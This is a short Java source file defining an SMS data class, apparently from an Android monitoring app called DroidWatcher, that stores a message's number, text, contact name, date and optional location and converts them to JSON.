package com.droidwatcher.lib;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

import org.json.JSONException;
import org.json.JSONObject;

import com.droidwatcher.Debug;

public class SMS implements IMessageBody {	
	public String number;
	public long date;
	public int type;
	public String name;
	public String text;
	public double lat;
	public double lon;
	
	public SMS(String text, long date, String name, String number, int type, double lat, double lon){
		this.text = text;
		this.date = date;
		this.name = name;
		this.type = type;
		this.number = number;
		this.lat = lat;
		this.lon = lon;
	}

	public JSONObject getJSONObject() {
		JSONObject obj = new JSONObject();
		try {
			obj.put("number", number);
			obj.put("date", date);
			obj.put("text", text);
			obj.put("type", type);
			obj.put("name", name);
			
			if (lat != 0 && lon != 0) {
				obj.put("lat", lat);
				obj.put("lon", lon);
			}
			
		} catch (JSONException e) {
			Debug.exception(e);
		}
		return obj;
	}
	
	public String getStringDate(){
		return SimpleDateFormat.getDateTimeInstance(SimpleDateFormat.SHORT, SimpleDateFormat.SHORT, new Locale("ru","RU")).format(new Date(date));
	}
	
}
